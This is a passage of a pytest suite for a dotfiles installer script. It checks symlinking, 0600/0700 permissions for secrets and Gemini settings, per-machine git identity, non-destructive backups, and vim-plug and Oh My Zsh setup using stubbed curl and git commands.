        stale = home / ".dotfiles_backup_20200101_000000/.gemini/settings.json"
        stale.parent.mkdir(parents=True)
        stale.write_text('{"Authorization": "Bearer old"}\n', encoding="utf-8")
        stale.chmod(0o644)

        res = run_sourced("create_symlinks", shell_env.env)
        assert res.returncode == 0, res.stderr

        assert self._mode(stale) == 0o600
        assert str(stale) in res.stdout + res.stderr

    def test_gemini_settings_symlink_to_a_directory_is_replaced(
        self, shell_env, tmp_path
    ):
        # `mv -f tmp dest` with dest a link to a directory moves the file INTO
        # that directory and leaves the link: the seed must not report success
        # for a file that is not at dest.
        home = shell_env.home
        elsewhere = tmp_path / "some-dir"
        elsewhere.mkdir()
        (home / ".gemini").mkdir(parents=True)
        (home / ".gemini/settings.json").symlink_to(elsewhere)

        res = run_sourced("create_symlinks", shell_env.env)
        assert res.returncode == 0, res.stderr

        settings = home / ".gemini/settings.json"
        assert settings.is_file() and not settings.is_symlink()
        assert list(elsewhere.iterdir()) == [], "the seed landed in the link target"

    def test_gemini_settings_failed_copy_never_lands_and_is_recorded(self, shell_env):
        home = shell_env.home
        (home / ".gemini").mkdir(parents=True)
        shell_env.stub("cp", exit_code=1)

        res, failures = run_recording("_seed_gemini_settings", shell_env.env)
        assert res.returncode == 0, res.stderr

        assert failures == ["Gemini settings.json"]
        assert not (home / ".gemini/settings.json").exists()
        assert not list((home / ".gemini").glob(".settings.json.*")), (
            "the failed seed left its temp file behind"
        )

    def test_gemini_dry_run_on_a_fresh_home_previews_the_0700_step(self, shell_env):
        # The real run creates ~/.gemini (ensure_dir) and then restricts it, so
        # the preview must announce that even though the dir does not exist yet.
        res = run_sourced("create_symlinks", {**shell_env.env, "DRY_RUN": "1"})
        assert res.returncode == 0, res.stderr
        assert any(
            "[DRY-RUN]" in ln and "~/.gemini" in ln and "0700" in ln
            for ln in res.stdout.splitlines()
        ), res.stdout

    def test_gemini_dir_linked_elsewhere_warns_that_it_is_not_restricted(
        self, shell_env, tmp_path
    ):
        # A user-redirected ~/.gemini (a link to a real dir outside the
        # checkout) is not chmodded through the link; say so instead of
        # silently leaving every Gemini rewrite at 0644.
        home = shell_env.home
        elsewhere = tmp_path / "gemini-elsewhere"
        elsewhere.mkdir()
        elsewhere.chmod(0o755)
        (home / ".gemini").symlink_to(elsewhere)

        res = run_sourced("create_symlinks", shell_env.env)
        assert res.returncode == 0, res.stderr

        assert self._mode(elsewhere) == 0o755
        out = res.stdout + res.stderr
        assert any("0700" in ln and "symlink" in ln for ln in out.splitlines()), out

    # --- ~/.zsh_secrets: seeded in $HOME, never in the checkout -------------
    # ~/.zshrc is a symlink into the repo, so an `export API_KEY=...` added to
    # it is edited inside the working tree and one `git add` from being
    # committed. The seeded file is the sanctioned place for those exports.

    def test_zsh_secrets_is_seeded_outside_the_checkout_owner_readable_only(
        self, shell_env
    ):
        home = shell_env.home
        res = run_sourced("create_symlinks", shell_env.env)
        assert res.returncode == 0, res.stderr

        secrets = home / ".zsh_secrets"
        assert secrets.is_file()
        assert not secrets.is_symlink(), (
            "a symlink would put the user's API keys inside the checkout"
        )
        # 0600: the umask subshell must leave no window where the file is
        # group/world readable.
        assert secrets.stat().st_mode & 0o077 == 0
        # Nothing by this name may appear in the repo itself.
        assert not (REPO_ROOT / ".zsh_secrets").exists()

    def test_zsh_secrets_is_never_overwritten(self, shell_env):
        """The whole point: a re-run must not wipe the keys already in it."""
        home = shell_env.home
        secrets = home / ".zsh_secrets"
        secrets.write_text("export GEMINI_API_KEY=real-key\n", encoding="utf-8")

        res = run_sourced("create_symlinks", shell_env.env)
        assert res.returncode == 0, res.stderr
        assert secrets.read_text(encoding="utf-8") == "export GEMINI_API_KEY=real-key\n"
        # Not backed up either -- it was never replaced, so there is nothing
        # to move aside.
        assert not any(p.exists() for p in home.glob(".dotfiles_backup_*/.zsh_secrets"))

    # `[ -e ]` is false for a symlink whose target is gone, so without a guard
    # a redirected secrets file (an encrypted volume, a synced folder) looks
    # absent and the seed writes THROUGH the link. With the target's parent
    # missing that write fails under set -e and the installer dies with no
    # [ERROR] line, before git config, the editor/Claude/Codex links, packages
    # and chsh; with the parent present it plants a stub at a location the user
    # chose for their real keys. The redirect is the user's either way: leave
    # it untouched.
    @pytest.mark.parametrize("parent_exists", [False, True])
    def test_zsh_secrets_dangling_symlink_is_left_alone(
        self, shell_env, tmp_path, parent_exists
    ):
        home = shell_env.home
        target_dir = tmp_path / "unmounted-volume"
        if parent_exists:
            target_dir.mkdir()
        target = target_dir / "zsh_secrets"
        secrets = home / ".zsh_secrets"
        secrets.symlink_to(target)

        res = run_sourced("create_symlinks", shell_env.env)

        assert res.returncode == 0, res.stderr
        assert secrets.is_symlink() and secrets.readlink() == target
        assert not target.exists(), "the seed was written through the user's link"
        assert "dangling" in res.stdout + res.stderr
        # The steps after the seed still ran.
        assert (home / ".config/git/os.gitconfig").is_file()

    # --- Git identity: rendered per machine, never tracked ------------------

    def test_git_identity_is_inherited_from_the_previous_config(
        self, shell_env, tmp_path
    ):
        """Upgrading from a ~/.gitconfig that carried [user] keeps it."""
        prior = tmp_path / "prior-gitconfig"
        prior.write_text(
            "[user]\n\tname = Prior Person\n\temail = prior@example.com\n",
            encoding="utf-8",
        )
        env = {**shell_env.env, "GIT_CONFIG_GLOBAL": str(prior)}

        res = run_sourced("create_symlinks", env)
        assert res.returncode == 0

        rendered = (shell_env.home / ".config/git/user.gitconfig").read_text(
            encoding="utf-8"
        )
        assert "name = Prior Person" in rendered
        assert "email = prior@example.com" in rendered

    def test_git_identity_is_inherited_through_an_include(self, shell_env, tmp_path):
        """A [user] pulled in by [include] is part of the identity git resolves.

        `git config --global <key>` does not follow includes -- git only does
        that by default when no file or scope is named -- so the common
        `[include] path = ~/.gitconfig.local` layout would read back as empty.
        The .gitconfig link then makes that file unreachable, and the identity
        drops out of the effective config with one warning line.
        """
        local = tmp_path / "gitconfig.local"
        local.write_text(
            "[user]\n\tname = Included Person\n\temail = included@example.com\n",
            encoding="utf-8",
        )
        prior = tmp_path / "prior-gitconfig"
        prior.write_text(f"[include]\n\tpath = {local}\n", encoding="utf-8")
        env = {**shell_env.env, "GIT_CONFIG_GLOBAL": str(prior)}

        res = run_sourced("create_symlinks", env)
        assert res.returncode == 0, res.stderr

        rendered = (shell_env.home / ".config/git/user.gitconfig").read_text(
            encoding="utf-8"
        )
        assert "name = Included Person" in rendered
        assert "email = included@example.com" in rendered

    def test_conditional_include_does_not_leak_into_the_global_identity(
        self, shell_env, tmp_path
    ):
        """--includes also resolves includeIf, against the CURRENT repository.

        install.sh is normally run from inside its own checkout, so a
        `[includeIf "gitdir:~/work/"]` identity -- meant for that directory
        only -- would match whenever the checkout lives under ~/work/, and be
        baked into user.gitconfig as the identity for every repository.
        """
        work_config = tmp_path / "work-config"
        work_config.write_text(
            "[user]\n\tname = Work Person\n\temail = work@example.com\n",
            encoding="utf-8",
        )
        work = tmp_path / "work"
        repo = work / "checkout"
        repo.mkdir(parents=True)
        subprocess.run(["git", "init", "-q", str(repo)], check=True)
        prior = tmp_path / "prior-gitconfig"
        prior.write_text(
            "[user]\n\tname = Personal Person\n\temail = personal@example.com\n"
            f'[includeIf "gitdir:{work}/"]\n\tpath = {work_config}\n',
            encoding="utf-8",
        )
        env = {**shell_env.env, "GIT_CONFIG_GLOBAL": str(prior)}

        res = run_sourced("create_symlinks", env, cwd=repo)
        assert res.returncode == 0, res.stderr

        rendered = (shell_env.home / ".config/git/user.gitconfig").read_text(
            encoding="utf-8"
        )
        assert "email = personal@example.com" in rendered
        assert "work@example.com" not in rendered

    # Same hazard as the dangling ~/.zsh_secrets above: `[ -e ]` is false on a
    # broken link, and `git config --file` / the placeholder printf then fail
    # on it (git cannot take the lock) under set -e.
    def test_git_identity_dangling_symlink_is_left_alone(self, shell_env, tmp_path):
        home = shell_env.home
        (home / ".config/git").mkdir(parents=True)
        target = tmp_path / "unmounted-volume/user.gitconfig"
        user_config = home / ".config/git/user.gitconfig"
        user_config.symlink_to(target)
        prior = tmp_path / "prior-gitconfig"
        prior.write_text(
            "[user]\n\tname = Prior Person\n\temail = prior@example.com\n",
            encoding="utf-8",
        )
        env = {**shell_env.env, "GIT_CONFIG_GLOBAL": str(prior)}

        res = run_sourced("create_symlinks", env)

        assert res.returncode == 0, res.stderr
        assert user_config.is_symlink() and user_config.readlink() == target
        assert "dangling" in res.stdout + res.stderr
        assert (home / ".config/nvim").is_symlink(), "later steps did not run"

    def test_git_identity_is_never_overwritten(self, shell_env):
        home = shell_env.home
        (home / ".config/git").mkdir(parents=True)
        existing = home / ".config/git/user.gitconfig"
        existing.write_text("[user]\n\tname = Do Not Touch\n", encoding="utf-8")

        res = run_sourced("create_symlinks", shell_env.env)
        assert res.returncode == 0
        assert existing.read_text(encoding="utf-8") == "[user]\n\tname = Do Not Touch\n"

    def test_git_identity_placeholder_is_inert_when_unknown(self, shell_env):
        """Non-interactive with nothing to inherit: warn, never guess.

        The keys stay commented out -- an empty `name =` would make git report a
        configured-but-blank identity rather than telling the user to set one.
        """
        res = run_sourced("create_symlinks", shell_env.env)
        assert res.returncode == 0

        rendered = (shell_env.home / ".config/git/user.gitconfig").read_text(
            encoding="utf-8"
        )
        assert "#[user]" in rendered
        for line in rendered.splitlines():
            assert line.startswith("#"), f"placeholder must be inert: {line!r}"

    def test_tracked_gitconfig_carries_no_identity(self):
        """Guard the leak itself, not just the machinery that avoids it."""
        text = (REPO_ROOT / ".gitconfig").read_text(encoding="utf-8")
        # Match the section header, not the substring: the file explains in a
        # comment why [user] is absent, and that comment is not a section.
        sections = [
            ln.strip()
            for ln in text.splitlines()
            if not ln.lstrip().startswith("#") and ln.strip().startswith("[")
        ]
        assert "[user]" not in sections, (
            ".gitconfig must not carry a [user] section: anyone who clones this "
            "repo and links it would commit under the owner's name and address"
        )
        assert "path = ~/.config/git/user.gitconfig" in text

    def test_rerun_is_idempotent(self, shell_env):
        home = shell_env.home
        (home / ".oh-my-zsh").mkdir()

        first = run_sourced("create_symlinks", shell_env.env)
        assert first.returncode == 0
        second = run_sourced("create_symlinks", shell_env.env)
        assert second.returncode == 0

        assert (home / ".zshrc").is_symlink()
        assert (home / ".zshrc").resolve() == (REPO_ROOT / ".zshrc").resolve()
        assert (home / ".codex/skills/backend-patterns").is_dir()

    def test_backup_preserves_files_sharing_a_basename(self, shell_env):
        # settings.json exists as a real file under BOTH ~/.claude and
        # ~/.config/Code/User. A flat, basename-only backup would move the
        # first into $backup_dir/settings.json and then overwrite it with the
        # second, destroying one of the user's real configs. Both must survive.
        home = shell_env.home
        (home / ".oh-my-zsh").mkdir()
        (home / ".claude").mkdir(parents=True)
        (home / ".claude/settings.json").write_text("CLAUDE-REAL\n", encoding="utf-8")
        (home / ".config/Code/User").mkdir(parents=True)
        (home / ".config/Code/User/settings.json").write_text(
            "CODE-REAL\n", encoding="utf-8"
        )

        res = run_sourced("create_symlinks", shell_env.env)
        assert res.returncode == 0, res.stderr

        backups = list(home.glob(".dotfiles_backup_*"))
        assert len(backups) == 1
        recovered = sorted(
            p.read_text(encoding="utf-8") for p in backups[0].rglob("settings.json")
        )
        assert recovered == ["CLAUDE-REAL\n", "CODE-REAL\n"], recovered

    def test_rerun_does_not_accumulate_backup_dirs(self, shell_env):
        # The rendered hooks.json is the one real file install.sh writes under
        # ~/.codex. Re-rendering it unconditionally would back its own previous
        # output into a fresh timestamped dir on every run, so ~/.dotfiles_backup_*
        # would pile up. A second no-change run must leave zero backup dirs.
        home = shell_env.home
        (home / ".oh-my-zsh").mkdir()

        first = run_sourced("create_symlinks", shell_env.env)
        assert first.returncode == 0, first.stderr
        second = run_sourced("create_symlinks", shell_env.env)
        assert second.returncode == 0, second.stderr

        assert list(home.glob(".dotfiles_backup_*")) == []
        # The links and rendered file are still in place after the no-op rerun.
        assert (home / ".codex/skills/backend-patterns").is_dir()
        assert (home / ".codex/hooks.json").is_file()

    def test_no_backup_dir_left_when_nothing_backed_up(self, shell_env):
        home = shell_env.home
        (home / ".oh-my-zsh").mkdir()

        res = run_sourced("create_symlinks", shell_env.env)
        assert res.returncode == 0
        # Fresh HOME: nothing real pre-existed, so the timestamped backup dir
        # must have been removed as empty.
        assert list(home.glob(".dotfiles_backup_*")) == []

    def test_migration_off_copies_backs_up_rather_than_deletes(self, shell_env):
        # THE safety invariant, under the linked-directory layout: install.sh
        # never DELETES under $HOME. Upgrading from an older copy-based install
        # finds a REAL ~/.codex/skills, and linking the directory moves the whole
        # thing aside -- our stale copies, Codex's managed .system, and any
        # hand-written skill alike. That is the unavoidable cost of linking the
        # dir rather than its entries, so the entire contents must survive in the
        # backup: this installer runs on other people's machines, where a wrong
        # delete is unrecoverable.
        home = shell_env.home
        (home / ".oh-my-zsh").mkdir()
        skills = home / ".codex/skills"
        (skills / ".system").mkdir(parents=True)
        (skills / ".system/SKILL.md").write_text("codex managed\n", encoding="utf-8")
        (skills / "my-own-skill").mkdir(parents=True)
        (skills / "my-own-skill/SKILL.md").write_text(
            "user authored\n", encoding="utf-8"
        )

        res = run_sourced("create_symlinks", shell_env.env)
        assert res.returncode == 0, res.stderr

        # The destination is now our link into the checkout...
        assert skills.is_symlink()
        assert skills.resolve() == (REPO_ROOT / ".codex/skills").resolve()

        # ...and everything that was there is recoverable, byte for byte.
        backups = list(home.glob(".dotfiles_backup_*"))
        assert len(backups) == 1
        saved = backups[0] / ".codex/skills"
        assert (saved / "my-own-skill/SKILL.md").read_text(
            encoding="utf-8"
        ) == "user authored\n"
        assert (saved / ".system/SKILL.md").read_text(
            encoding="utf-8"
        ) == "codex managed\n"

    def test_shared_codex_skills_resolve_to_claude_sources(self, shell_env):
        # The shared set lives in the repo tree (.codex/skills/<name> ->
        # ../../.claude/skills/<name>), not in an install.sh array. Every entry
        # must resolve to a real skill: a dangling link deploys a skill Codex
        # cannot read, and nothing in install.sh would catch that.
        home = shell_env.home
        (home / ".oh-my-zsh").mkdir()

        res = run_sourced("create_symlinks", shell_env.env)
        assert res.returncode == 0, res.stderr

        shared = [p for p in (REPO_ROOT / ".codex/skills").iterdir() if p.is_symlink()]
        assert shared, "expected .codex/skills to hold symlinks into .claude/skills"
        for link in shared:
            target = link.resolve()
            assert target.is_dir(), f"{link.name} is dangling: {target}"
            assert target.parent == (REPO_ROOT / ".claude/skills").resolve(), (
                f"{link.name} points outside .claude/skills: {target}"
            )
            assert (target / "SKILL.md").is_file(), f"{link.name} has no SKILL.md"
            # And it is reachable through the deployed link, as Codex sees it.
            assert (home / ".codex/skills" / link.name / "SKILL.md").is_file()

    def test_links_vscode_configs_on_linux(self, shell_env):
        # No OS set (mirrors "no OS var in the ambient test env"): the
        # non-macos / Linux-style ~/.config destinations must be used.
        home = shell_env.home
        (home / ".oh-my-zsh").mkdir()

        res = run_sourced("create_symlinks", shell_env.env)
        assert res.returncode == 0, res.stderr

        vscode_user = home / ".config/Code/User"
        for name in ("settings.json", "keybindings.json"):
            code_link = vscode_user / name
            assert code_link.is_symlink(), f"Code {name} should be linked"
            assert (
                code_link.resolve()
                == (REPO_ROOT / ".config/Code/User" / name).resolve()
            )

    def test_links_vscode_configs_on_macos(self, shell_env):
        home = shell_env.home
        (home / ".oh-my-zsh").mkdir()
        env = dict(shell_env.env)
        env["OS"] = "macos"

        res = run_sourced("create_symlinks", env)
        assert res.returncode == 0, res.stderr

        vscode_user = home / "Library/Application Support/Code/User"
        for name in ("settings.json", "keybindings.json"):
            assert (vscode_user / name).is_symlink()

    def test_links_vscode_configs_on_windows(self, shell_env):
        """detect_os yields "windows" for msys/cygwin, and that needs its own branch.

        VS Code on Windows reads user settings from %APPDATA%\\Code\\User. Only
        distinguishing macOS from "everything else" would land a Git Bash install's
        links under $HOME/.config/Code/User, where the Windows build never looks -- the
        symlinks would exist and have no effect. Not verified against a real Windows VS
        Code from here; this pins the path the branch is supposed to produce.
        """
        home = shell_env.home
        (home / ".oh-my-zsh").mkdir()
        appdata = home / "AppData/Roaming"
        appdata.mkdir(parents=True)
        env = dict(shell_env.env)
        env["OS"] = "windows"
        env["APPDATA"] = str(appdata)

        res = run_sourced("create_symlinks", env)
        assert res.returncode == 0, res.stderr

        vscode_user = appdata / "Code/User"
        for name in ("settings.json", "keybindings.json"):
            assert (vscode_user / name).is_symlink(), (
                f"{name} was not linked under %APPDATA%/Code/User"
            )

    def test_windows_without_appdata_falls_back_rather_than_failing(self, shell_env):
        """Git Bash normally exports APPDATA, but a bare msys shell may not.

        Falling back to the Linux-style path keeps the installer from aborting under
        `set -u`; that is a degradation, not a regression.
        """
        home = shell_env.home
        (home / ".oh-my-zsh").mkdir()
        env = dict(shell_env.env)
        env["OS"] = "windows"
        env.pop("APPDATA", None)

        res = run_sourced("create_symlinks", env)
        assert res.returncode == 0, res.stderr
        assert (home / ".config/Code/User/settings.json").is_symlink()


class TestInstallAiTools:
    def test_skips_prompt_when_non_interactive(self, shell_env):
        # Piped/CI runs have no TTY on stdin. A bare `read` returns non-zero at
        # EOF and, under `set -e`, would abort the whole installer before the
        # later steps (MCP registration, shell change). The function must skip
        # cleanly and return 0 instead of aborting.
        res = run_sourced('install_ai_tools </dev/null; echo "RC=$?"', shell_env.env)
        assert "RC=0" in res.stdout, res.stdout + res.stderr
        assert "Non-interactive" in res.stdout
        assert "Do you want to install" not in res.stdout


class TestInstallVimPlugins:
    """Vim being absent (exit 127) and a real PlugInstall failure must each warn
    instead of printing print_success; a bare `vim +PlugInstall +qall || true`
    would swallow both."""

    def test_missing_vim_warns_and_skips(self, shell_env):
        # macOS ships its own /usr/bin/vim alongside a homebrew one, so a
        # PATH strip can't make `vim` genuinely unresolvable without also
        # taking dirname/touch/sudo (also under /usr/bin) down with it.
        # Shadow `vim` as a function instead (that blocks a direct invocation
        # too, so a real vim is never spawned either way) and make
        # command_exists agree it is absent (drives the guard).
        res = run_sourced(
            "vim() { return 127; }; "
            'command_exists() { [ "$1" = "vim" ] && return 1 '
            '|| command -v "$1" >/dev/null 2>&1; }; '
            'install_vim_plugins; echo "AFTER_VIM_PLUGINS"',
            shell_env.env,
        )
        assert res.returncode == 0, res.stderr
        assert "AFTER_VIM_PLUGINS" in res.stdout
        assert "[WARNING]" in res.stdout
        assert "Vim plugins installed" not in res.stdout

    def test_plug_install_failure_warns_instead_of_claiming_success(self, shell_env):
        shell_env.stub("vim", exit_code=1)
        res = run_sourced(
            'install_vim_plugins; echo "AFTER_VIM_PLUGINS"', shell_env.env
        )
        assert res.returncode == 0, res.stderr
        assert "AFTER_VIM_PLUGINS" in res.stdout
        assert "[WARNING]" in res.stdout
        assert "Vim plugins installed" not in res.stdout

    def test_successful_plug_install_prints_success(self, shell_env):
        shell_env.stub("vim")
        res = run_sourced(
            'install_vim_plugins; echo "AFTER_VIM_PLUGINS"', shell_env.env
        )
        assert res.returncode == 0, res.stderr
        assert "Vim plugins installed" in res.stdout


# `curl -o` streams into its target, so a connection dropped mid-transfer leaves a
# partial plug.vim behind rather than nothing. The existence check below the download
# would then report success over the corpse, and -- worse -- the `[ ! -f ]` guard above
# it would make every future run skip the download entirely, so no rerun of install.sh
# could ever repair it. fetch_and_run (used for the other downloads) refuses truncated
# and empty bodies; install_vim_plug has to as well.
_CURL_TRUNCATED = """
for arg in "$@"; do
  if [ "$prev" = "-fLo" ]; then mkdir -p "$(dirname "$arg")"; printf 'partial' > "$arg"; fi
  prev="$arg"
done
exit 1
"""


class TestInstallVimPlug:
    def test_truncated_download_is_not_reported_as_success(self, shell_env):
        shell_env.stub("curl", body=_CURL_TRUNCATED)
        res = run_sourced('install_vim_plug; echo "AFTER"', shell_env.env)
        assert res.returncode == 0, res.stderr
        assert "AFTER" in res.stdout
        assert "[WARNING]" in res.stdout
        assert "vim-plug installed" not in res.stdout, (
            "a failed download printed success because the partial file exists"
        )

    def test_a_failed_download_leaves_nothing_behind_so_a_rerun_retries(
        self, shell_env
    ):
        """The sticky half: a corpse on disk disables the retry path forever."""
        shell_env.stub("curl", body=_CURL_TRUNCATED)
        run_sourced("install_vim_plug", shell_env.env)
        plug = shell_env.home / ".vim/autoload/plug.vim"
        assert not plug.exists(), (
            "a failed download left a partial plug.vim, so `[ ! -f ]` will skip "
            "the download on every future run and the corruption is permanent"
        )

    def test_a_successful_download_is_kept_and_reported(self, shell_env):
        shell_env.stub(
            "curl",
            body=(
                'for arg in "$@"; do\n'
                '  if [ "$prev" = "-fLo" ]; then mkdir -p "$(dirname "$arg")"; '
                'printf \'" real plug.vim\\n\' > "$arg"; fi\n'
                '  prev="$arg"\n'
                "done\n"
            ),
        )
        res = run_sourced("install_vim_plug", shell_env.env)
        assert res.returncode == 0, res.stderr
        assert "vim-plug installed" in res.stdout
        assert (shell_env.home / ".vim/autoload/plug.vim").exists()

    def test_an_existing_plug_vim_is_not_redownloaded(self, shell_env):
        plug = shell_env.home / ".vim/autoload/plug.vim"
        plug.parent.mkdir(parents=True)
        plug.write_text('" already here\n', encoding="utf-8")
        shell_env.stub("curl", exit_code=1)
        res = run_sourced("install_vim_plug", shell_env.env)
        assert res.returncode == 0, res.stderr
        assert "vim-plug installed" in res.stdout
        assert plug.read_text(encoding="utf-8") == '" already here\n'


class TestOptionalEntryLoopsDoNotAbortTheInstaller:
    """A missing OPTIONAL entry must not take the whole installer down.

    Each `_link_*_config` walks an array and links the entries that exist. The
    loop body must not take this form:

        for entry in "${entries[@]}"; do
          [ -e "$DOTFILES_DIR/.x/$entry" ] && link_entry ...
        done

    The `[ -e ]` guard tolerates an absent entry for every element except the
    LAST. When the final element is missing, `&&` short-circuits, the for-loop's
    exit status is that of the failed test, and because the loop is the
    function's last command the function returns 1. Under `set -eo pipefail`
    (the `set` line near the top of install.sh) that kills the run, and main()
    exits 1 having printed NO error at all: a silent, unexplained failure in
    the middle of an install.

    Each `_link_*_config` therefore uses `if [ -e ... ]; then link_entry ...;
    fi`, which does not carry a missing last entry's failed test into the
    loop's exit status. This test pins that against a regression back to the
    `&&` form.

    Reachable from a sparse/partial clone, a zip export, a user who deleted the
    Gemini config -- or simply from someone appending a new optional entry to
    one of these arrays later.
    """

    @pytest.mark.parametrize(
        ("fn", "subdir", "entries"),
        [
            ("_link_claude_config", ".claude", ["CLAUDE.md", "skills"]),
            ("_link_codex_config", ".codex", ["AGENTS.md", "skills"]),
            ("_link_gemini_config", ".gemini", ["GEMINI.md", "settings.json"]),
        ],
    )
    def test_missing_last_entry_still_returns_success(
        self, shell_env, tmp_path, fn, subdir, entries
    ):
        # A checkout that has the FIRST entry but not the LAST.
        fake_repo = tmp_path / "fake-dotfiles"
        (fake_repo / subdir).mkdir(parents=True)
        (fake_repo / subdir / entries[0]).write_text("x\n", encoding="utf-8")
        assert not (fake_repo / subdir / entries[-1]).exists()

        env = {**shell_env.env, "DRY_RUN": "0"}
        res = run_sourced(
            f'DOTFILES_DIR="{fake_repo}"; {fn}; echo "RC=$?"; echo REACHED_NEXT_LINE',
            env,
        )

        assert "RC=0" in res.stdout, (
            f"{fn} returned non-zero because its last optional entry was "
            f"missing:\nstdout={res.stdout!r}\nstderr={res.stderr!r}"
        )
        assert "REACHED_NEXT_LINE" in res.stdout, (
            f"set -e killed the script after {fn} -- silently, with no error "
            f"message:\nstdout={res.stdout!r}\nstderr={res.stderr!r}"
        )
        # The entry that IS present must still have been linked.
        assert (shell_env.home / subdir / entries[0]).is_symlink()

    @pytest.mark.parametrize(
        ("fn", "subdir", "entry"),
        [
            ("_link_claude_config", ".claude", "CLAUDE.md"),
            ("_link_codex_config", ".codex", "AGENTS.md"),
            ("_link_gemini_config", ".gemini", "GEMINI.md"),
        ],
    )
    def test_a_real_link_failure_still_propagates(
        self, shell_env, tmp_path, fn, subdir, entry
    ):
        # The fix must not turn into a blanket `|| true`: if link_entry itself
        # fails, that is a genuine error and has to keep aborting.
        fake_repo = tmp_path / "fake-dotfiles"
        (fake_repo / subdir).mkdir(parents=True)
        (fake_repo / subdir / entry).write_text("x\n", encoding="utf-8")

        env = {**shell_env.env, "DRY_RUN": "0"}
        res = run_sourced(
            f'DOTFILES_DIR="{fake_repo}"\n'
            "link_entry() { return 3; }\n"
            f'{fn}; echo "RC=$?"',
            env,
        )
        assert "RC=0" not in res.stdout, (
            f"{fn} swallowed a real link_entry failure: {res.stdout!r}"
        )


class TestCodexConfigWithoutACodexTree:
    """_link_codex_config must survive a checkout that has no .codex at all.

    Its entry loop is written with `if [ -e "$DOTFILES_DIR/.codex/$entry" ]`
    precisely so a missing entry is skipped rather than fatal, and the
    "~/.codex resolves into the checkout" guard right below it is a plain
    `-ef` test for the same reason. If either step failed under `set -e` with
    .codex absent, the whole installer would go down mid-way, ending with the
    top-level dotfiles and .claude linked, no [ERROR] line, and no hint that
    anything was skipped.
    """

    def test_missing_codex_tree_is_skipped_not_fatal(self, shell_env, tmp_path):
        fake_repo = tmp_path / "fake-dotfiles"
        fake_repo.mkdir()
        assert not (fake_repo / ".codex").exists()

        env = {**shell_env.env, "DRY_RUN": "0"}
        res = run_sourced(
            f'DOTFILES_DIR="{fake_repo}"; _link_codex_config; echo "RC=$?"; '
            "echo REACHED_NEXT_LINE",
            env,
        )
        assert "RC=0" in res.stdout, (
            "_link_codex_config failed on a checkout without .codex:\n"
            f"stdout={res.stdout!r}\nstderr={res.stderr!r}"
        )
        assert "REACHED_NEXT_LINE" in res.stdout, (
            "set -e killed the installer after _link_codex_config, silently:\n"
            f"stdout={res.stdout!r}\nstderr={res.stderr!r}"
        )


class TestStrictMode:
    def test_pipefail_enabled(self, shell_env):
        # Pipelines like `curl ... | sudo tee` must not swallow curl's exit
        # status. Test the actual behavior (not `set -o` text) so it stays
        # meaningful even if the option is enabled a different way.
        res = run_sourced(
            "if false | true; then echo RESULT=swallowed; "
            "else echo RESULT=pipefail-detected; fi",
            shell_env.env,
        )
        assert res.returncode == 0, res.stderr
        assert "RESULT=pipefail-detected" in res.stdout


# Simulates `git clone URL DEST` closely enough for the rerun tests above and
# below to mean anything. Two behaviours are copied from real git:
#
#   1. it REFUSES a DEST that already exists and is not empty -- "fatal:
#      destination path ... already exists and is not an empty directory",
#      exit 128. An existing but EMPTY DEST is accepted, which is why
#      reclaim_aborted_clone only has to empty a directory, never remove it;
#   2. a successful clone leaves the plugin's own files behind, not merely the
#      directory. A stub that only ran `mkdir -p DEST` would make every test
#      that re-runs an installer assert against a state no real clone ever
#      produces -- the blind spot that lets a guard keyed on the DIRECTORY look
#      idempotent in tests while wedging on a real machine.
#
# DEST's own basename plus a `.zsh` sibling covers all three clone sites
# (tpm/tpm, zsh-autosuggestions/zsh-autosuggestions.zsh,
# zsh-syntax-highlighting/zsh-syntax-highlighting.zsh); the one extra file per
# site is inert. README.md stands in for "a checkout has top-level files", the
# property that tells a real checkout apart from an interrupted clone.
_GIT_CLONE_STUB = r"""
if [ "$1" = "clone" ]; then
  dest="${@: -1}"
  if [ -d "$dest" ] && [ -n "$(find "$dest" -mindepth 1 -maxdepth 1)" ]; then
    echo "fatal: destination path '$dest' already exists and is not an empty directory." >&2
    exit 128
  fi
  mkdir -p "$dest/.git"
  name="$(basename "$dest")"
  : >"$dest/$name"
  chmod +x "$dest/$name"
  : >"$dest/$name.zsh"
  : >"$dest/README.md"
fi
"""


class TestInstallOhMyZsh:
    def _stub_git_clone(self, shell_env):
        shell_env.stub("git", body=_GIT_CLONE_STUB)

    def _mark_omz_installed(self, home):
        """Make install_oh_my_zsh consider Oh My Zsh already present.

        It tests for the oh-my-zsh.sh entry point rather than the directory
        (see the comment at the top of install_oh_my_zsh in install.sh): a
        directory test would skip the install forever once ~/.oh-my-zsh exists
        without an install, e.g. a half-made $ZSH. These tests cover the
        custom/ handling, not the download, so short-circuit the install the
        same way a real machine with Oh My Zsh already on it would.
        """
        omz = home / ".oh-my-zsh"
        omz.mkdir(exist_ok=True)
        (omz / "oh-my-zsh.sh").write_text("# stub entry point\n", encoding="utf-8")

    def test_heals_symlinked_custom_dir_before_cloning_plugins(
        self, shell_env, tmp_path
    ):
        # An older install may have symlinked $HOME/.oh-my-zsh/custom straight
        # into the dotfiles checkout, which only ships themes/ (no plugins/).
        # install_oh_my_zsh must convert it back to a real directory BEFORE
        # cloning plugins, or the clone lands inside the checkout.
        self._stub_git_clone(shell_env)
        home = shell_env.home
        self._mark_omz_installed(home)
        fake_dotfiles_custom = tmp_path / "fake-dotfiles" / ".oh-my-zsh" / "custom"
        (fake_dotfiles_custom / "themes").mkdir(parents=True)
        (home / ".oh-my-zsh/custom").symlink_to(fake_dotfiles_custom)

        res = run_sourced("install_oh_my_zsh", shell_env.env)
        assert res.returncode == 0, res.stderr

        custom = home / ".oh-my-zsh/custom"
        assert not custom.is_symlink()
        assert custom.is_dir()
        assert (custom / "plugins/zsh-autosuggestions").is_dir()
        assert (custom / "plugins/zsh-syntax-highlighting").is_dir()
        # The clone must never have landed inside the (simulated) checkout.
        assert not (fake_dotfiles_custom / "plugins").exists()

    def test_rerun_does_not_reclone_existing_plugins(self, shell_env):
        self._stub_git_clone(shell_env)
        home = shell_env.home
        self._mark_omz_installed(home)

        first = run_sourced("install_oh_my_zsh", shell_env.env)
        assert first.returncode == 0, first.stderr
        clone_calls_1 = [c for c in shell_env.calls if c.startswith("git clone")]

        second = run_sourced("install_oh_my_zsh", shell_env.env)
        assert second.returncode == 0, second.stderr
        clone_calls_2 = [c for c in shell_env.calls if c.startswith("git clone")]

        assert clone_calls_2 == clone_calls_1
        assert not (home / ".oh-my-zsh/custom").is_symlink()


# Simulates Oh My Zsh's own official installer. Two behaviours matter here and
# both are copied from the real tools/install.sh:
#
#   1. it refuses to run when $ZSH (~/.oh-my-zsh) already exists;
#   2. setup_zshrc moves an existing ~/.zshrc aside to ~/.zshrc.pre-oh-my-zsh
#      and writes its own template in its place. Its guard is
